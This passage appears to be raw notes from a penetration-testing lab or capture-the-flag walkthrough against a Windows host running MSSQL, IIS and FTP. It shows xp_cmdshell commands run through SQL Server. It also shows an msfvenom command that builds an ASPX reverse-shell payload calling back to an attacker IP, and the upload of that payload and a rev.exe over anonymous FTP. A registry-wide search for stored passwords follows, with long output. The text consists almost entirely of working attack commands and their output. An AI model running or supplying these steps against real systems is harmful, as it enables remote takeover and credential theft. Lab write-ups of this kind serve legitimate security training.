04/27/2020  06:26 PM    <DIR>          inetpub                                     

05/20/2020  02:48 PM    <DIR>          PerfLogs                                    

05/20/2020  01:44 PM    <DIR>          Program Files                               

04/27/2020  06:54 PM    <DIR>          Program Files (x86)                         

04/27/2020  06:50 PM    <DIR>          SQLServer2017Media                          

04/27/2020  06:46 PM    <DIR>          Users                                       

05/25/2020  06:06 PM    <DIR>          Windows                                     

               0 File(s)              0 bytes                                      

               8 Dir(s)  32,263,196,672 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir "C:\FTP"
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is DA63-C4D5                                                 

NULL                                                                               

 Directory of C:\FTP                                                               

NULL                                                                               

03/21/2022  09:38 AM    <DIR>          .                                           

03/21/2022  09:38 AM    <DIR>          ..                                          

04/27/2020  07:02 PM            18,866 Elementum Supremum.docx                     

04/27/2020  07:02 PM           764,176 file_example_MP3_700KB.mp3                  

04/27/2020  07:02 PM            15,690 img.jpg                                     

04/27/2020  07:02 PM               302 MSSQL_BAK.rar                               

04/27/2020  07:02 PM               548 palindromes.txt                             

04/27/2020  07:02 PM            45,369 server.jpg                                  

               6 File(s)        844,951 bytes                                      

               2 Dir(s)  32,263,196,672 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell C:\FTP\rev.exe
output                                                                             

--------------------------------------------------------------------------------   

The system cannot execute the specified program.                                   

NULL                                                                               

SQL> 

```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ pftp 192.168.137.70 1221                                                                   
Connected to 192.168.137.70.
220 Microsoft FTP Service
Name (192.168.137.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put rev.exe
local: rev.exe remote: rev.exe
227 Entering Passive Mode (192,168,137,70,194,20).
150 Opening BINARY mode data connection.
226 Transfer complete.
7168 bytes sent in 0.00 secs (27.1267 MB/s)
ftp> 

```

## ASPX Revshell

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.137 LPORT=1221 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3386 bytes
Saved as: rev.aspx
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ pftp 192.168.137.70 1221                                                                     
Connected to 192.168.137.70.
220 Microsoft FTP Service
Name (192.168.137.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put rev.aspx
local: rev.aspx remote: rev.aspx
227 Entering Passive Mode (192,168,137,70,194,23).
125 Data connection already open; Transfer starting.
226 Transfer complete.
3386 bytes sent in 0.00 secs (18.9949 MB/s)
ftp> 
```


## Registry

```
SQL> xp_cmdshell dir "C:\inetpub\wwwroot\images"
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is DA63-C4D5                                                 

NULL                                                                               

 Directory of C:\inetpub\wwwroot\images                                            

NULL                                                                               

04/27/2020  06:42 PM    <DIR>          .                                           

04/27/2020  06:42 PM    <DIR>          ..                                          

04/27/2020  06:42 PM             1,030 favicon.png                                 

04/27/2020  06:42 PM             1,818 plt-hub-orange.png                          

               2 File(s)          2,848 bytes                                      

               2 Dir(s)  32,253,734,912 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell "reg query HKLM /f pass /t REG_SZ /s"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}   

    (Default)    REG_SZ    Picture Password Enrollment UX                          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}   

    (Default)    REG_SZ    PicturePasswordLogonProvider                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{24954E9B-D39A-4168-A3B2-E5014C94492F}   

    (Default)    REG_SZ    OOBE Upgrade Password Page                              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}   

    (Default)    REG_SZ    RASGCW Change Password Class                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}   

    (Default)    REG_SZ    Cert Password UI class                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}   

    (Default)    REG_SZ    PasswordProvider                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID   

    (Default)    REG_SZ    IAS.ChangePassword.1                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}   

    (Default)    REG_SZ    V1PasswordProvider                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}   

    InfoTip    REG_SZ    Manages users and passwords for this computer             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}   

    (Default)    REG_SZ    LogonPasswordReset                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}   

    (Default)    REG_SZ    Password retry UI class                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{9fb45d27-dfe3-4383-b117-ab631787649a}   

    (Default)    REG_SZ    Picture Password Task Handler                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell   

    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}   

    (Default)    REG_SZ    HomeGroup Password Command                              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}   

    (Default)    REG_SZ    Password Expired UI class                               

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer                      

    (Default)    REG_SZ    IAS.ChangePassword.1                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}   

    (Default)    REG_SZ    IHomeGroupPassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{0cf1e460-bc2c-587c-9822-420ba04d0551}   

    (Default)    REG_SZ    IAsyncOperationCompletedHandler_1_Windows__CDevices__CSensors__CCompass   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{0db7eb30-afb5-4173-909b-1d971772f5db}   

    (Default)    REG_SZ    IPairingPasskey                                         

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{0db7eb30-afb5-4173-909b-1d971772f5dc}   

    (Default)    REG_SZ    IPairingPasskey2                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}   

    (Default)    REG_SZ    _PasswordDeriveBytes                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}   

    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}   

    (Default)    REG_SZ    IPicturePasswordTaskHandler                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}   

    (Default)    REG_SZ    IPasswordOnWakeSetting                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}   

    (Default)    REG_SZ    IPasswordVault                                          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{61fd3165-2ea2-4279-8b9a-99c53e6615ed}   

    (Default)    REG_SZ    Windows.Networking.UX.IWiFiPassKeyUIPrompt              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}   

    (Default)    REG_SZ    ISupportPasswordMode                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}   

    (Default)    REG_SZ    IPasswordCredential                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{76D7759A-857C-46BD-BA0C-841904E0FC8D}   

    (Default)    REG_SZ    ISnapAssistCallback                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{8969ba84-c62a-4938-a80a-f7869ad99630}   

    (Default)    REG_SZ    Windows.Networking.UX.IEAPTLSCertPasswordUIPrompt       

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}   

    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{9934b56b-2a2d-4505-9fde-4a76aa1b212f}   

    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInputFactory       

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}   

    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{a38b29dd-3e53-4a2f-b6da-9bd13c58db43}   

    (Default)    REG_SZ    Windows.Networking.UX.IEAPPasswordChangeUIPrompt        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}   

    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{B63CB15A-D1AA-4A39-BC06-78E9843BF5C4}   

    (Default)    REG_SZ    ISnapAssistViewHost                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{C69E96B2-6161-3621-B165-5805198C6B8D}   

    (Default)    REG_SZ    _PrimaryInteropAssemblyAttribute                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{e10deb05-6b58-4b7b-adc8-65cb74a3553d}   

    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInput              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{E787D73D-A121-5AE6-B497-AB934837E57F}   

    (Default)    REG_SZ    ITypedEventHandler_2_Windows__CDevices__CSensors__CCompass_Windows__CDevices__CSensors__CCompassReadingChangedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{F37C3D8D-6082-46C0-B22D-96BC5EC87FD9}   

    (Default)    REG_SZ    IStoredPassRootDocument                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Microsoft.PowerShellScript.1\Shell\0\Command   

    (Default)    REG_SZ    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & '%1'"   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\{00020430-0000-0000-C000-000000000046}\2.0   

    PrimaryInteropAssemblyName    REG_SZ    stdole, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\{11A8B8EE-BF30-409A-8EF7-3A143EF70332}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.Interop.Security.AzRoles Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\{DC59A585-A719-43A7-BB9B-6D82B5873CB0}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.SQLTaskConnectionsWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.SQLTaskConnectionsWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\{FF6681CD-490A-498C-B8C9-81223B6056FC}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.DTSRuntimeWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.DTSRuntimeWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}   

    (Default)    REG_SZ    PicturePasswordLogonProvider                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}   

    (Default)    REG_SZ    RASGCW Change Password Class                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}   

    (Default)    REG_SZ    Cert Password UI class                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}   

    (Default)    REG_SZ    PasswordProvider                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID   

    (Default)    REG_SZ    IAS.ChangePassword.1                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}   

    (Default)    REG_SZ    V1PasswordProvider                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}   

    InfoTip    REG_SZ    Manages users and passwords for this computer             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}   

    (Default)    REG_SZ    LogonPasswordReset                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}   

    (Default)    REG_SZ    Password retry UI class                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell   

    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}   

    (Default)    REG_SZ    HomeGroup Password Command                              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}   

    (Default)    REG_SZ    Password Expired UI class                               

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}   

    (Default)    REG_SZ    IHomeGroupPassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{0cf1e460-bc2c-587c-9822-420ba04d0551}   

    (Default)    REG_SZ    IAsyncOperationCompletedHandler_1_Windows__CDevices__CSensors__CCompass   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{0db7eb30-afb5-4173-909b-1d971772f5db}   

    (Default)    REG_SZ    IPairingPasskey                                         

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{0db7eb30-afb5-4173-909b-1d971772f5dc}   

    (Default)    REG_SZ    IPairingPasskey2                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}   

    (Default)    REG_SZ    _PasswordDeriveBytes                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}   

    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}   

    (Default)    REG_SZ    IPicturePasswordTaskHandler                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}   

    (Default)    REG_SZ    IPasswordOnWakeSetting                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}   

    (Default)    REG_SZ    IPasswordVault                                          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}   

    (Default)    REG_SZ    ISupportPasswordMode                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}   

    (Default)    REG_SZ    IPasswordCredential                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{76D7759A-857C-46BD-BA0C-841904E0FC8D}   

    (Default)    REG_SZ    ISnapAssistCallback                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}   

    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}   

    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}   

    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{B63CB15A-D1AA-4A39-BC06-78E9843BF5C4}   

    (Default)    REG_SZ    ISnapAssistViewHost                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{C69E96B2-6161-3621-B165-5805198C6B8D}   

    (Default)    REG_SZ    _PrimaryInteropAssemblyAttribute                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{E787D73D-A121-5AE6-B497-AB934837E57F}   

    (Default)    REG_SZ    ITypedEventHandler_2_Windows__CDevices__CSensors__CCompass_Windows__CDevices__CSensors__CCompassReadingChangedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{F37C3D8D-6082-46C0-B22D-96BC5EC87FD9}   

    (Default)    REG_SZ    IStoredPassRootDocument                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\TypeLib\{00020430-0000-0000-C000-000000000046}\2.0   

    PrimaryInteropAssemblyName    REG_SZ    stdole, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\TypeLib\{11A8B8EE-BF30-409A-8EF7-3A143EF70332}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.Interop.Security.AzRoles Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\TypeLib\{DC59A585-A719-43A7-BB9B-6D82B5873CB0}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.SQLTaskConnectionsWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.SQLTaskConnectionsWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\TypeLib\{FF6681CD-490A-498C-B8C9-81223B6056FC}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.DTSRuntimeWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.DTSRuntimeWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Enrollments\ValidNodePaths                   

    NodePath8    REG_SZ    PassportForWork                                         

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\AdvancedOptions\BROWSE\FTPPASV   

    Text    REG_SZ    Use Passive FTP (for firewall and DSL modem compatibility)   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest   

    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Authentication\AllowAadPasswordReset   

    RegValueNameRedirect    REG_SZ    AllowPasswordReset                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Browser\AllowPasswordManager   

    GPBlockingRegValueName    REG_SZ    FormSuggest Passwords                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\CredentialProviders\BlockPicturePassword   

    RegValueNameRedirect    REG_SZ    BlockDomainPicturePassword                   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\CredentialsUI\DisablePasswordReveal   

    RegValueNameRedirect    REG_SZ    DisablePasswordReveal                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\AllowSimpleDevicePassword   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\AlphanumericDevicePasswordRequired   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\DevicePasswordExpiration   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\DevicePasswordHistory   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MaxDevicePasswordFailedAttempts   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MaxInactivityTimeDeviceLock   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MinDevicePasswordComplexCharacters   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

    parentPolicyMinor    REG_SZ    AlphanumericDevicePasswordRequired              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\DeviceLock\MinDevicePasswordLength   

    parentPolicyMajor    REG_SZ    DevicePasswordEnabled                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\InternetExplorer\AllowAutoComplete   

    RegValueNameRedirect    REG_SZ    FormSuggest Passwords                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\LocalPoliciesSecurityOptions\Accounts_LimitLocalAccountUseOfBlankPasswordsToConsoleLogonOnly   

    RegValueNameRedirect    REG_SZ    LimitBlankPasswordUse                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\LocalPoliciesSecurityOptions\MicrosoftNetworkClient_SendUnencryptedPasswordToThirdPartySMBServers   

    RegValueNameRedirect    REG_SZ    EnablePlainTextPassword                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\RemoteDesktopServices\DoNotAllowPasswordSaving   

    RegValueNameRedirect    REG_SZ    DisablePasswordSaving                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\RemoteDesktopServices\PromptForPasswordUponConnection   

    RegValueNameRedirect    REG_SZ    fPromptForPassword                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Provisioning\CSPs\.\Device\Vendor\MSFT\PassportForWork   

    csp_version    REG_SZ    com.microsoft/1.4/MDM/PassportForWork                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Provisioning\CSPs\.\User\Vendor\MSFT\PassportForWork   

    csp_version    REG_SZ    com.microsoft/1.4/MDM/PassportForWork                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Provisioning\CSPs\.\Vendor\MSFT\PassportForWork   

    csp_version    REG_SZ    com.microsoft/1.4/MDM/PassportForWork                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\RSAT-Feature-Tools-BitLocker-BdeAducExt   

    DisplayName    REG_SZ    BitLocker Recovery Password Viewer                    

    Description    REG_SZ    BitLocker Recovery Password Viewer helps locate BitLocker Drive Encryption recovery passwords for Windows-based computers in Active Directory Domain Services (AD DS).   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\Web-Basic-Auth   

    Description    REG_SZ    Basic authentication offers strong browser compatibility. Appropriate for small internal networks, this authentication method is rarely used on the public Internet. Its major disadvantage is that it transmits passwords across    

the network using an easily decrypted algorithm. If intercepted, these passwords are simple to decipher. Use SSL with Basic authentication.   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\Web-CGI   

    Description    REG_SZ    CGI defines how a Web server passes information to an external program. Typical uses might include using a Web form to collect information and then passing that information to a CGI script to be emailed somewhere else. Because   

 CGI is a standard, CGI scripts can be written using a variety of programming languages. The downside to using CGI is the performance overhead.   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ServerManager\ServicingStorage\ServerComponentCache\Web-Digest-Auth   

    Description    REG_SZ    Digest authentication works by sending a password hash to a Windows domain controller to authenticate users. When you need improved security over Basic authentication, consider using Digest authentication, especially if users    

who must be authenticated access your Web site from behind firewalls and proxy servers.   

NULL                                                                               

